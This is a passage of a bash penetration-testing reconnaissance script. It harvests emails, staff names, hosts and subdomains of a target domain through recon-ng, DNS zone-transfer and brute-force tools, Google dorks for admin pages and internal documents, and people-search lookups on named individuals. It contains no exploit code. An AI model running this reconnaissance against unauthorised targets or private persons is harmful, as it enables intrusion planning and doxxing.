news|index|infant|inform|innovation|installation|insurers|integrated|intellectual|international|internet|instructor|insurance|intelligence|interested|interns|investigation|investment|investor|israel|items|japan|job|justice|kelowna|knowing|language|laptops|large|leader|letter|level|liaison|licensing|lighting|linguist|linkedin|limitless|liveedu|llp|local|looking|lpn|ltd|lsu|luscous|machinist|macys|malware|managed|management|manager|managing|manufacturing|market|mastering|material|mathematician|maturity|md|mechanic|media|medical|medicine|member|merchandiser|meta tags|methane|metro|microsoft|middle east|migration|mission|mitigation|mn|money|monitor|more coming|mortgage|motor|museums|mutual|national|negative|network|network|new user|newspaper|new york|next page|night|nitrogen|nw|nyc|obtain|occupied|offers|office|online|onsite|operations|operator|order|organizational|outbreak|owner|packaging|page|palantir|paralegal|partner|pathology|peace|people|perceptions|person|pharmacist|philippines|photo|picker|picture|placement|places|planning|police|portfolio|postdoctoral|potassium|potential|preassigned|preparatory|president|principal|print|private|process|producer|product|professional|professor|profile|project|program|property|publichealth|published|pyramid|quality|questions|rcg|recruiter|redeem|redirect|region|register|registry|regulation|rehab|remote|report|representative|republic|research|resolving|responsable|restaurant|retired|revised|rising|rural health|russia|sales|sample|satellite|save the date|school|scheduling|science|scientist|search|searc|sections|secured|security|secretary|secrets|see more|selection|senior|server|service|services|social|software|solution|source|special|sql|station home|statistics|store|strategy|strength|student|study|substitute|successful|sunoikisis|superheroines|supervisor|support|surveillance|switch|system|systems|talent|targeted|tax|tcp|teach|technical|technician|technique|technology|temporary|tester|textoverflow|theater|thought|through|time in|tit for tat|title|toolbook|tools|toxic|traditions|trafficking|transfer|transformation|treasury|trojan|truck|twitter|training|ts|tylenol|types of scams|unclaimed|underground|underwriter|university|united states|untitled|vault|verification|vietnam|view|Violent|virginia bar|voice|volkswagen|volume|vp|wanted|web search|web site|website|welcome|west virginia|westchester|when the|whiskey|window|worker|world|www|xbox|zz)' tmp3 > tmp4
          sed 's/iii/III/g' tmp4 | sed 's/ii/II/g' > tmp5
          # Capitalize the first letter of every word
          sed 's/\b\(.\)/\u\1/g' tmp5 | sed 's/Mca/McA/g; s/Mcb/McB/g; s/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcf/McF/g; s/Mcg/McG/g; s/Mci/McI/g; s/Mck/McK/g; s/Mcl/McL/g; s/Mcm/McM/g; s/Mcn/McN/g; s/Mcs/McS/g; s/,,/,/g' > tmp6
          grep -v ',' tmp6 | awk '{print $2", "$1}' > tmp7
          grep ',' tmp7 > tmp8
          # Remove trailing whitespace from each line
          cat tmp7 tmp8 | sed 's/[ \t]*$//' | sort -u > names
     fi

     ##############################################################

     echo
     echo "recon-ng                  (31/$total)"
     echo
     echo "workspaces add $domain" > $discover/passive.rc
     echo "add companies" >> $discover/passive.rc
     echo "$companyurl" >> $discover/passive.rc
     sed -i 's/%26/\&/g;s/%20/ /g;s/%2C/\,/g' $discover/passive.rc
     echo "none" >> $discover/passive.rc
     echo "add domains" >> $discover/passive.rc
     echo "$domain" >> $discover/passive.rc
     echo >> $discover/passive.rc

     if [ -e passive2.rc ]; then
          cat passive2.rc >> $discover/passive.rc
     fi

     if [ -e names ]; then
          echo "last_name#first_name" > $home/data/names2.csv
          cat names | sed 's/, /#/' >> $home/data/names2.csv
          cat $discover/resource/recon-ng-import-names2.rc >> $discover/passive.rc
          echo >> $discover/passive.rc
     fi

     cat $discover/resource/recon-ng.rc >> $discover/passive.rc
     sed -i "s/yyy/$domain/g" $discover/passive.rc

     recon-ng --no-check -r $discover/passive.rc

     ##############################################################

     grep "@$domain" /tmp/emails | awk '{print $2}' | egrep -v '(>|SELECT)' | sort -u > emails-recon
     cat emails emails-recon | sort -u > emails-final

     grep '|' /tmp/names | egrep -iv '(_|aepohio|aepsoc|arin-notify|contact|netops|production)' | sed 's/|//g; s/^[ \t]*//; /^[0-9]/d; /^-/d' | tr '[A-Z]' '[a-z]' | sed 's/\b\(.\)/\u\1/g; s/iii/III/g; s/ii/II/g; s/Mca/McA/g; s/Mcb/McB/g; s/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcf/McF/g; s/Mcg/McG/g; s/Mci/McI/g; s/Mck/McK/g; s/Mcl/McL/g; s/Mcm/McM/g; s/Mcn/McN/g; s/Mcs/McS/g; s/[ \t]*$//' | sort -u > names-recon

     grep '/' /tmp/networks | grep -v 'Spooling' | awk '{print $2}' | $sip > networks-recon

     grep "$domain" /tmp/subdomains | egrep -v '(>|SELECT)' | awk '{print $2,$4}' | sed 's/|//g' | column -t | sort -u > sub-recon

     ##############################################################

     cat networks-tmp networks-recon | sort -u | $sip > networks 2>/dev/null

     cat sub* | grep -v "$domain\." | grep -v '|' | sed 's/www\.//g' | grep -v 'SELECT' | column -t | tr '[A-Z]' '[a-z]' | sort -u > tmp
     # Remove lines that contain a single word
     sed '/[[:blank:]]/!d' tmp > subdomains

     awk '{print $2}' subdomains > tmp
     grep -E '([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})' tmp | egrep -v '(-|=|:)' | $sip > hosts

     if [ -e networks ]; then
          cat networks > tmp 2>/dev/null
          echo >> tmp
     fi

     cat hosts >> tmp 2>/dev/null
     cat tmp >> $home/data/$domain/data/hosts.htm; echo "</pre>" >> $home/data/$domain/data/hosts.htm 2>/dev/null

     ##############################################################

     echo "Summary" > zreport
     echo $short >> zreport

     echo > tmp

     if [ -e emails-final ]; then
          emailcount=$(wc -l emails-final | cut -d ' ' -f1)
          echo "Emails               $emailcount" >> zreport
          echo "Emails ($emailcount)" >> tmp
          echo $short >> tmp
          cat emails-final >> tmp
          echo >> tmp
          cat emails-final >> $home/data/$domain/data/emails.htm; echo "</pre>" >> $home/data/$domain/data/emails.htm
     else
          echo "No data found." >> $home/data/$domain/data/emails.htm; echo "</pre>" >> $home/data/$domain/data/emails.htm
     fi

     if [ -e names-recon ]; then
          namecount=$(wc -l names-recon | cut -d ' ' -f1)
          echo "Names                $namecount" >> zreport
          echo "Names ($namecount)" >> tmp
          echo $short >> tmp
          cat names-recon >> tmp
          echo >> tmp
          cat names-recon >> $home/data/$domain/data/names.htm; echo "</pre>" >> $home/data/$domain/data/names.htm
     else
          echo "No data found." >> $home/data/$domain/data/names.htm; echo "</pre>" >> $home/data/$domain/data/names.htm
     fi

     if [ -s networks ]; then
          networkcount=$(wc -l networks | cut -d ' ' -f1)
          echo "Networks             $networkcount" >> zreport
          echo "Networks ($networkcount)" >> tmp
          echo $short >> tmp
          cat networks >> tmp
          echo >> tmp
     fi

     if [ -e hosts ]; then
          hostcount=$(wc -l hosts | cut -d ' ' -f1)
          echo "Hosts                $hostcount" >> zreport
          echo "Hosts ($hostcount)" >> tmp
          echo $short >> tmp
          cat hosts >> tmp
          echo >> tmp
     fi

     if [ -e registered-domains ]; then
          domaincount1=$(wc -l registered-domains | cut -d ' ' -f1)
          domaincount2=$(echo $(($domaincount1-1)))
          echo "Registered Domains   $domaincount2" >> zreport
          echo "Registered Domains ($domaincount2)" >> tmp
          echo $long >> tmp
          cat registered-domains >> tmp
          echo >> tmp
          cat registered-domains >> $home/data/$domain/data/registered-domains.htm; echo "</pre>" >> $home/data/$domain/data/registered-domains.htm
     else
          echo "No data found." >> $home/data/$domain/data/registered-domains.htm; echo "</pre>" >> $home/data/$domain/data/registered-domains.htm
     fi

     if [ -e squatting ]; then
          urlcount2=$(wc -l squatting | cut -d ' ' -f1)
          echo "Squatting            $urlcount2" >> zreport
          echo "Squatting ($urlcount2)" >> tmp
          echo $long >> tmp
          cat squatting >> tmp
          echo >> tmp
          cat squatting >> $home/data/$domain/data/squatting.htm; echo "</pre>" >> $home/data/$domain/data/squatting.htm
     else
          echo "No data found." >> $home/data/$domain/data/squatting.htm; echo "</pre>" >> $home/data/$domain/data/squatting.htm
     fi

     if [ -e subdomains ]; then
          urlcount=$(wc -l subdomains | cut -d ' ' -f1)
          echo "Subdomains           $urlcount" >> zreport
          echo "Subdomains ($urlcount)" >> tmp
          echo $long >> tmp
          cat subdomains >> tmp
          echo >> tmp
          cat subdomains >> $home/data/$domain/data/subdomains.htm; echo "</pre>" >> $home/data/$domain/data/subdomains.htm
     else
          echo "No data found." >> $home/data/$domain/data/subdomains.htm; echo "</pre>" >> $home/data/$domain/data/subdomains.htm
     fi

     if [ -e xls ]; then
          xlscount=$(wc -l xls | cut -d ' ' -f1)
          echo "Excel                $xlscount" >> zreport
          echo "Excel Files ($xlscount)" >> tmp
          echo $long >> tmp
          cat xls >> tmp
          echo >> tmp
          cat xls >> $home/data/$domain/data/xls.htm; echo "</pre>" >> $home/data/$domain/data/xls.htm
     else
          echo "No data found." >> $home/data/$domain/data/xls.htm; echo "</pre>" >> $home/data/$domain/data/xls.htm
     fi

     if [ -e pdf ]; then
          pdfcount=$(wc -l pdf | cut -d ' ' -f1)
          echo "PDF                  $pdfcount" >> zreport
          echo "PDF Files ($pdfcount)" >> tmp
          echo $long >> tmp
          cat pdf >> tmp
          echo >> tmp
          cat pdf >> $home/data/$domain/data/pdf.htm; echo "</pre>" >> $home/data/$domain/data/pdf.htm
     else
          echo "No data found." >> $home/data/$domain/data/pdf.htm; echo "</pre>" >> $home/data/$domain/data/pdf.htm
     fi

     if [ -e ppt ]; then
          pptcount=$(wc -l ppt | cut -d ' ' -f1)
          echo "PowerPoint           $pptcount" >> zreport
          echo "PowerPoint Files ($pptcount)" >> tmp
          echo $long >> tmp
          cat ppt >> tmp
          echo >> tmp
          cat ppt >> $home/data/$domain/data/ppt.htm; echo "</pre>" >> $home/data/$domain/data/ppt.htm
     else
          echo "No data found." >> $home/data/$domain/data/ppt.htm; echo "</pre>" >> $home/data/$domain/data/ppt.htm
     fi

     if [ -e txt ]; then
          txtcount=$(wc -l txt | cut -d ' ' -f1)
          echo "Text                 $txtcount" >> zreport
          echo "Text Files ($txtcount)" >> tmp
          echo $long >> tmp
          cat txt >> tmp
          echo >> tmp
          cat txt >> $home/data/$domain/data/txt.htm; echo "</pre>" >> $home/data/$domain/data/txt.htm
     else
          echo "No data found." >> $home/data/$domain/data/txt.htm; echo "</pre>" >> $home/data/$domain/data/txt.htm
     fi

     if [ -e doc ]; then
          doccount=$(wc -l doc | cut -d ' ' -f1)
          echo "Word                 $doccount" >> zreport
          echo "Word Files ($doccount)" >> tmp
          echo $long >> tmp
          cat doc >> tmp
          echo >> tmp
          cat doc >> $home/data/$domain/data/doc.htm; echo "</pre>" >> $home/data/$domain/data/doc.htm
     else
          echo "No data found." >> $home/data/$domain/data/doc.htm; echo "</pre>" >> $home/data/$domain/data/doc.htm
     fi

     cat tmp >> zreport

     if [ -e whois-domain ]; then
          echo "Whois Domain" >> zreport
          echo $long >> zreport
          cat whois-domain >> zreport
          cat whois-domain >> $home/data/$domain/data/whois-domain.htm; echo "</pre>" >> $home/data/$domain/data/whois-domain.htm
     else
          echo "No data found." >> $home/data/$domain/data/whois-domain.htm; echo "</pre>" >> $home/data/$domain/data/whois-domain.htm
     fi

     if [ -e whois-ip ]; then
          echo >> zreport
          echo "Whois IP" >> zreport
          echo $long >> zreport
          cat whois-ip >> zreport
          cat whois-ip >> $home/data/$domain/data/whois-ip.htm; echo "</pre>" >> $home/data/$domain/data/whois-ip.htm
     else
          echo "No data found." >> $home/data/$domain/data/whois-ip.htm; echo "</pre>" >> $home/data/$domain/data/whois-ip.htm
     fi

     cat zreport >> $home/data/$domain/data/passive-recon.htm; echo "</pre>" >> $home/data/$domain/data/passive-recon.htm

     mv recon-ng.rc $home/data/$domain/ 2>/dev/null
     rm curl debug* emails* domain hosts names* network* passive* registered* squatting sub* tmp* whois* z* doc pdf ppt txt xls 2>/dev/null
     rm $home/data/*.csv 2>/dev/null
     cd /tmp/
     rm emails names networks profiles subdomains registered-domains $discover/passive.rc 2>/dev/null

     # Robtex
     wget -q https://gfx.robtex.com/gfx/graph.png?dns=$domain -O $home/data/$domain/assets/images/robtex.png

     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The supporting data folder is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$domain/
     echo
     read -p "Press <return> to continue."

     ##############################################################

     f_runlocally

     $web &
     sleep 4
     $web https://www.google.com/search?site=\&tbm=isch\&source=hp\&q=$companyurl%2Blogo &
     sleep 2

     # File types
     $web https://www.google.com/#q=site%3A$domain+filetype%3Adoc+OR+filetype%3Adocx &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Appt+OR+filetype%3Apptx &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Axls+OR+filetype%3Axlsx &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+filetype%3Atxt &
     sleep 2

     $web https://www.google.com/#q=site%3A$domain+inurl:admin &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+inurl:login &
     sleep 2

     $web https://www.google.com/#q=site%3A$domain+%22index+of/%22+%22parent+directory%22 &
     sleep 2
     $web https://www.google.com/#q=site%3A$domain+%22internal+use+only%22 &
     sleep 2

     $web https://www.google.com/#q=site%3Apastebin.com+intext:%40$domain &
     sleep 2
     $web http://api.hackertarget.com/pagelinks/?q=$domain &
     sleep 2

     $web https://dockets.justia.com/search?parties=%22$companyurl%22&cases=mostrecent &
     sleep 2
     $web http://www.reuters.com/finance/stocks/lookup?searchType=any\&search=$companyurl &
     sleep 2
     $web https://www.sec.gov/cgi-bin/browse-edgar?company=$companyurl\&owner=exclude\&action=getcompany &
     sleep 2
     $web https://www.ssllabs.com/ssltest/analyze.html?d=$domain\&hideResults=on\&latest &
     sleep 2
     $web $home/data/$domain/index.htm &
     echo
     echo
     exit
     ;;

     2)
     clear
     f_banner

     echo -e "\x1B[1;34mUses Nmap, dnsrecon, Fierce, lbd, WAF00W, traceroute, and Whatweb.\x1B[0m"
     echo
     echo -e "\x1B[1;34m[*] Acquire API keys for Bing, Builtwith, Fullcontact, GitHub, Google,\x1B[0m"
     echo -e "\x1B[1;34mHashes, and Shodan for maximum results with recon-ng.\x1B[0m"
     echo
     echo $medium
     echo
     echo "Usage: target.com"
     echo
     echo -n "Domain: "
     read domain

     # Check for no answer
     if [[ -z $domain ]]; then
          f_error
     fi

     # If folder doesn't exist, create it
     if [ ! -d $home/data/$domain ]; then
          cp -R $discover/report/ $home/data/$domain
          sed 's/REPLACEDOMAIN/'$domain'/g' $home/data/$domain/index.htm > tmp
          mv tmp $home/data/$domain/index.htm
     fi

     # Number of tests
     total=11

     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g;s/\&/%26/g;s/\,/%2C/g' )

     echo
     echo $medium
     echo

     echo "Nmap"
     echo "     Email                (1/$total)"
     nmap -Pn -n --open -p80 --script-timeout 1m --script=http-grep $domain > tmp
     grep '@' tmp | awk '{print $3}' > emails1

     echo
     echo "dnsrecon"
     echo "     DNS Records          (2/$total)"
     dnsrecon -d $domain -t std > tmp
     egrep -v '(All queries|Bind Version|Could not|Enumerating SRV|is resolving|not configured|Performing|Records Found|Recursion|Resolving|TXT|Wildcard)' tmp | sort > tmp2
     # Remove first 6 characters from each line
     sed 's/^......//g' tmp2 | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15}' | column -t | sort -u -k2 -k1 > tmp3
     grep 'TXT' tmp | sed 's/^......//g' | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15}' | sort > tmp4
     cat tmp3 tmp4 > records
     cat $home/data/$domain/data/records.htm records | grep -v '<' | sort -u > records2

     echo '<pre style="font-size:14px;">' > $home/data/$domain/data/records.htm
     cat records2 >> $home/data/$domain/data/records.htm; echo "</pre>" >> $home/data/$domain/data/records.htm

     echo "     Zone Transfer        (3/$total)"
     dnsrecon -d $domain -t axfr > tmp
     egrep -v '(Checking for|Failed|filtered|NS Servers|Removing|TCP Open|Testing NS)' tmp | sed 's/^....//g' | sed /^$/d > zonetransfer

     echo "     Sub-domains (~5 min) (4/$total)"
     if [ -f /usr/share/dnsrecon/namelist.txt ]; then
          dnsrecon -d $domain -t brt -D /usr/share/dnsrecon/namelist.txt --iw -f > tmp
     fi

     # PTF
     if [ -f /pentest/intelligence-gathering/dnsrecon/namelist.txt ]; then
          dnsrecon -d $domain -t brt -D /pentest/intelligence-gathering/dnsrecon/namelist.txt --iw -f > tmp
     fi

     grep $domain tmp | grep -v "$domain\." | egrep -v '(Performing|Records Found)' | sed 's/\[\*\] //g; s/^[ \t]*//' | awk '{print $2,$3}' | column -t | sort -u > subdomains-dnsrecon

     echo
     echo "Fierce (~5 min)           (5/$total)"
     if [ -f /usr/share/fierce/hosts.txt ]; then
          fierce -dns $domain -wordlist /usr/share/fierce/hosts.txt -suppress -file tmp4
     fi

     # PTF
     if [ -f /pentest/intelligence-gathering/fierce/hosts.txt ]; then
          fierce -dns $domain -wordlist /pentest/intelligence-gathering/fierce/hosts.txt -suppress -file tmp4
     fi

     sed -n '/Now performing/,/Subnets found/p' tmp4 | grep $domain | awk '{print $2 " " $1}' | column -t | sort -u > subdomains-fierce

     cat subdomains-dnsrecon subdomains-fierce | egrep -v '(.nat.|1.1.1.1|6.9.6.9|127.0.0.1)' | column -t | tr '[A-Z]' '[a-z]' | sort -u | awk '$2 !~ /[a-z]/' > subdomains

     if [ -e $home/data/$domain/data/subdomains.htm ]; then
          cat $home/data/$domain/data/subdomains.htm subdomains | grep -v "<" | grep -v "$domain\." | column -t | sort -u > subdomains-combined
          echo '<pre style="font-size:14px;">' > $home/data/$domain/data/subdomains.htm
          cat subdomains-combined >> $home/data/$domain/data/subdomains.htm
          echo "</pre>" >> $home/data/$domain/data/subdomains.htm
     fi

     awk '{print $3}' records > tmp
     awk '{print $2}' subdomains-dnsrecon subdomains-fierce >> tmp
     grep -E '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}' tmp | egrep -v '(-|=|:|1.1.1.1|6.9.6.9|127.0.0.1)' | $sip > hosts

     echo
     echo "Loadbalancing             (6/$total)"
     lbd $domain > tmp 2>/dev/null
     # Remove first 5 lines & clean up
     sed '1,5d' tmp | sed 's/DNS-Loadbalancing: NOT FOUND/DNS-Loadbalancing:\nNOT FOUND\n/g' | sed 's/\[Date\]: /\[Date\]:\n/g' | sed 's/\[Diff\]: /\[Diff\]:\n/g' > tmp2
     # Replace the 10th comma with a new line & remove leading whitespace from each line
     sed 's/\([^,]*,\)\{9\}[^,]*,/&\n/g' tmp2 | sed 's/^[ \t]*//' | sed 's/, NOT/\nNOT/g' | grep -v 'NOT use' > loadbalancing

     echo
     echo "Web Application Firewall  (7/$total)"
     wafw00f -a http://www.$domain > tmp
     cat tmp | egrep -v '(By Sandro|Checking http://www.|Generic Detection|requests|WAFW00F)' > tmp2
     sed "s/ http:\/\/www.$domain//g" tmp2 | egrep -v "(\_|\^|\||<|')" | sed '1,4d' > waf

     echo
     echo "Traceroute"
     echo "     UDP                  (8/$total)"
     echo "UDP" > tmp
     traceroute $domain | awk -F" " '{print $1,$2,$3}' >> tmp
     echo >> tmp
     echo "ICMP ECHO" >> tmp
     echo "     ICMP ECHO            (9/$total)"
     traceroute -I $domain | awk -F" " '{print $1,$2,$3}' >> tmp
     echo >> tmp
     echo "TCP SYN" >> tmp
     echo "     TCP SYN              (10/$total)"
     traceroute -T $domain | awk -F" " '{print $1,$2,$3}' >> tmp
     grep -v 'traceroute' tmp > tmp2
     # Remove blank lines from end of file
     awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp2 > ztraceroute

     echo
     echo "Whatweb                   (11/$total)"
     grep -v '<' $home/data/$domain/data/subdomains.htm | awk '{print $1}' > tmp
     whatweb -i tmp --color=never --no-errors > tmp2 2>/dev/null
     # Find lines that start with http, and insert a line after
     sort tmp2 | sed '/^http/a\ ' > tmp3
     # Cleanup
     sed 's/,/\n/g' tmp3 | sed 's/^[ \t]*//' | sed 's/\(\[[0-9][0-9][0-9]\]\)/\n\1/g; s/http:\/\///g' | grep -v 'Country' > whatweb

     grep '@' whatweb | sed 's/Email//g; s/\[//g; s/\]//g' > tmp
     # Change to lower case
     cat tmp | tr '[A-Z]' '[a-z]' > emails2
     cat emails1 emails2 | grep "@$domain" | grep -v 'hosting' | cut -d ' ' -f2 | sort -u > emails

     # If this file is empty, delete it
     if [ ! -s emails ]; then rm emails; fi
     if [ ! -s hosts ]; then rm hosts; fi
     if [ ! -s records ]; then rm records; fi
     if [ ! -s subdomains ]; then rm subdomains; fi

     echo
     echo "recon-ng                  (12/$total)"
     cp $discover/resource/recon-ng-active.rc $discover/
     sed -i "s/xxx/$companyurl/g" $discover/recon-ng-active.rc
     sed -i 's/%26/\&/g;s/%20/ /g;s/%2C/\,/g' $discover/recon-ng-active.rc
     sed -i "s/yyy/$domain/g" $discover/recon-ng-active.rc
     recon-ng --no-check -r $discover/recon-ng-active.rc

     grep "$domain" /tmp/subdomains | grep -v '>' | awk '{print $2,$4}' | column -t > sub-recon

     ##############################################################

     echo > zreport
     echo >> zreport

     echo "Summary" >> zreport
     echo $short >> zreport

     echo > tmp

     if [ -e emails ]; then
          emailcount=$(wc -l emails | cut -d ' ' -f1)
          echo "Emails        $emailcount" >> zreport
          echo "Emails ($emailcount)" >> tmp
          echo $short >> tmp
          cat emails >> tmp
          echo >> tmp
     fi

     if [ -e hosts ]; then
          hostcount=$(wc -l hosts | cut -d ' ' -f1)
          echo "Hosts         $hostcount" >> zreport
          echo "Hosts ($hostcount)" >> tmp
          echo $short >> tmp
          cat hosts >> tmp
          echo >> tmp
     fi

     if [ -e records ]; then
          recordcount=$(wc -l records | cut -d ' ' -f1)
          echo "DNS Records   $recordcount" >> zreport
          echo "DNS Records ($recordcount)" >> tmp
          echo $long >> tmp
          cat records >> tmp
          echo >> tmp
     fi

     if [ -e subdomains ]; then
          subdomaincount=$(wc -l subdomains | cut -d ' ' -f1)
          echo "Subdomains    $subdomaincount" >> zreport
          echo "Subdomains ($subdomaincount)" >> tmp
          echo $long >> tmp
          cat subdomains >> tmp
          echo >> tmp
     fi

     cat tmp >> zreport

     echo "Loadbalancing" >> zreport
     echo $long >> zreport
     cat loadbalancing >> zreport

     echo "Web Application Firewall" >> zreport
     echo $long >> zreport
     cat waf >> zreport

     echo >> zreport
     echo "Traceroute" >> zreport
     echo $long >> zreport
     cat ztraceroute >> zreport

     echo >> zreport
     echo "Zone Transfer" >> zreport
     echo $long >> zreport
     cat zonetransfer >> zreport

     echo >> zreport
     echo "Whatweb" >> zreport
     echo $long >> zreport
     cat whatweb >> zreport

     cat loadbalancing >> $home/data/$domain/data/loadbalancing.htm; echo "</pre>" >> $home/data/$domain/data/loadbalancing.htm
     cat zreport >> $home/data/$domain/data/active-recon.htm; echo "</pre>" >> $home/data/$domain/data/active-recon.htm
     cat ztraceroute >> $home/data/$domain/data/traceroute.htm; echo "</pre>" >> $home/data/$domain/data/traceroute.htm
     cat waf >> $home/data/$domain/data/waf.htm; echo "</pre>" >> $home/data/$domain/data/waf.htm
     cat whatweb >> $home/data/$domain/data/whatweb.htm; echo "</pre>" >> $home/data/$domain/data/whatweb.htm
     cat zonetransfer >> $home/data/$domain/data/zonetransfer.htm; echo "</pre>" >> $home/data/$domain/data/zonetransfer.htm

     if [[ -e $home/data/$domain/data/emails.htm && -e emails ]]; then
          cat $home/data/$domain/data/emails.htm emails | grep -v '<' | sort -u > tmp
          echo '<pre style="font-size:14px;">' > $home/data/$domain/data/emails.htm
          cat tmp >> $home/data/$domain/data/emails.htm; echo "</pre>" >> $home/data/$domain/data/emails.htm
     fi

     cat hosts $home/data/$domain/data/hosts.htm | grep -v '<' | $sip > tmp
     echo '<pre style="font-size:14px;">' > $home/data/$domain/data/hosts.htm
     cat tmp >> $home/data/$domain/data/hosts.htm; echo "</pre>" >> $home/data/$domain/data/hosts.htm

     rm emails* hosts loadbalancing recon-ng-active.rc records* sub* tmp* waf whatweb z* /tmp/subdomains 2>/dev/null

     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The supporting data folder is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$domain/
     echo
     echo

     $web $home/data/$domain/index.htm &
     exit
     ;;

     3) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_person(){
f_runlocally
clear
f_banner

echo -e "\x1B[1;34mRECON\x1B[0m"
echo
echo -n "First name: "
read firstName

# Check for no answer
if [[ -z $firstName ]]; then
     f_error
fi

echo -n "Last name:  "
read lastName

# Check for no answer
if [[ -z $lastName ]]; then
     f_error
fi

$web &
sleep 2
$web http://www.411.com/name/$firstName-$lastName/ &
sleep 2
uripath="http://www.advancedbackgroundchecks.com/search/results.aspx?type=&fn=${firstName}&mi=&ln=${lastName}&age=&city=&state="
$web $uripath &
sleep 2
$web https://www.linkedin.com/pub/dir/?first=$firstName\&last=$lastName\&search=Search &
sleep 2
$web http://www.peekyou.com/$firstName%5f$lastName &
sleep 2
$web http://phonenumbers.addresses.com/people/$firstName+$lastName &
sleep 2
$web https://pipl.com/search/?q=$firstName+$lastName\&l=\&sloc=\&in=5 &
sleep 2
$web http://www.spokeo.com/$firstName-$lastName &
sleep 2
$web https://twitter.com/search?q=%22$firstName%20$lastName%22&src=typd &
sleep 2
$web https://www.youtube.com/results?search_query=$firstName+$lastName &
sleep 2
$web http://www.zabasearch.com/query1_zaba.php?sname=$firstName%20$lastName&state=ALL&ref=$ref&se=$se&doby=&city=&name_style=1&tm=&tmr= &

f_main
}

##############################################################################################################

f_salesforce(){
clear
f_banner

echo -e "\x1B[1;34mCreate a free account at salesforce (https://connect.data.com/login).\x1B[0m"
echo -e "\x1B[1;34mPerform a search on your target > select the company name > see all.\x1B[0m"
echo -e "\x1B[1;34mCopy the results into a new file.\x1B[0m"
echo -e "\x1B[1;34m[*] Note: each record should be on a single line.\x1B[0m"

f_location

echo

# Remove blank lines, strings, and leading white space. Set tab as the delimiter
cat $location | sed '/^$/d; s/\[Direct Dial Available\]//g; s/Direct Dial Available//g; s/;/:/g; s/^[ \t]*//; s/ \+ /\t/g' > tmp

# Place names into a file and sort by uniq
cut -d $'\t' -f1 tmp | sort -u > tmp2

# grep name, sort by data field, then uniq by the name field - selecting the most recent entry
# select and and title from result and colon delimit into file
while read line; do
    grep "$line" tmp | sort -t ',' -k7M | sort -uk1,1r | awk -F$'\t' '{print $1":"$3}' | sed 's/ :/:/g' >> tmp3
done < tmp2

column -s ':' -t tmp3 > tmp4

# Clean-up
cat tmp4 | sed 's/ -- /, /g; s/ - /, /g; s/,,/,/g; s/, ,/, /g; s/\//, /g; s/[^ ]\+/\L\u&/g; s/-.*$//g; s/1.*$//g; s/1/I/g; s/2/II/g; s/3/III/g; s/4/IV/g; 
s/5/V/g; s/2cfinancedistributionoperations//i; s/-administration/, Administration/i; s/-air/, Air/i; s/, ,  and$//g; s/ And / and /g; s/ api / API /i; 
s/ at.*$//g; s/ asic / ASIC /i; s/AssistantChiefPatrolAgent/Assistant Chief Patrol Agent/g; s/-associate/-associate/i; s/ at .*//i; s/ atm / ATM /i; 
s/ bd / BD /i; s/-big/, Big/i; s/BIIb/B2B/g; s/-board/, Board/i; s/-boiler/, Boiler/i; s/ bsc / BSC /i; s/-call/, Call/i; s/-capacity/, Capacity/i; 
s/-cash/, Cash/i; s/ cbt / CBT /i; s/-chief/, Chief/i; s/ cip / CIP /i; s/ cissp / CISSP /i; s/-civil/, Civil/i; s/ cj / CJ /i; s/Clients//g; 
s/ cmms / CMMS /i; s/ cms / CMS /i; s/-commercial/, Commercial/i; s/CommitteemanagementOfficer/Committee Management Officer/g; 
s/-communications/, Communications/i; s/-community/, Community/i; s/-compliance/, Compliance/i; s/-consumer/, Consumer/i; s/contact sold, to//i; 
s/-corporate/, Corporate/i; s/ cpa/ CPA/i; s/-creative/, Creative/i; s/ crm / CRM /i; s/ctr /Center/i; s/-customer/, Customer/i; s/-data/, Data/i; 
s/ db2 / DB2 /i; s/ dbii / DB2 /i; s/DDesigner/Designer/i; s/DesignatedFederalOfficial/Designated Federal Official/g; s/-design/, Design/i; s/dhs/DHS/i; 
s/-digital/, Digital/i; s/-distribution/, Distribution/i; s/ dns / DNS /i; s/-dominion/-dominion/i; s/-drilling/, Drilling/i; s/ dvp / DVP /i; 
s/ ebs / EBS /i; s/editorr/Editor/i; s/ edrm / EDRM /i; s/ eeo / EEO /i; s/ efi / EFI /i; s/-electric/, Electric/i; 
s/EleCenterEngineer/Electric Engineer/i; s/ emc / EMC /i; s/ emea/ EMEA/i; s/-employee/, Employee/i; s/ ems / EMS /i; s/-energy/, Energy/i; 
s/engineer5/Engineer V/i; s/-engineering/, Engineering/i; s/-engineer/, Engineer/i; s/-environmental/, Environmental/i; s/-executive/, Executive/i; 
s/ faa / FAA /i; s/-facilities/, Facilities/i; s/ ferc / FERC /i; s/ fha / FHA /i; s/-finance/, Finance/i; s/-financial/, Financial/i; 
s/-fleet/, Fleet/i; s/ For / for /g; s/ fsa / FSA /i; s/ fso / FSO /i; s/ fx / FX /i; s/ gaap / GAAP /i; s/-gas/, Gas/i; s/-general/, General/i; 
s/-generation/, Generation/i; s/grp/Group/i; s/ gsa / GSA /i; s/ gsis / GSIS /i; s/ gsm / GSM /i; s/ hd / HD /i; s/ hiv / HIV /i; s/ hmrc / HMRC /i; 
s/ hp / HP /i; s/ hq / HQ /i; s/ hris / HRIS /i; s/-human/, Human/i; s/ hvac / HVAC /i; s/ ia / IA /i; s/ id / ID /i; s/ iii/ III/i; s/ ii/ II/i; 
s/ iis / IIS /i; s/ In / in /g; s/-industrial/, Industrial/i; s/information technology/IT/i; s/-information/, Information/i; 
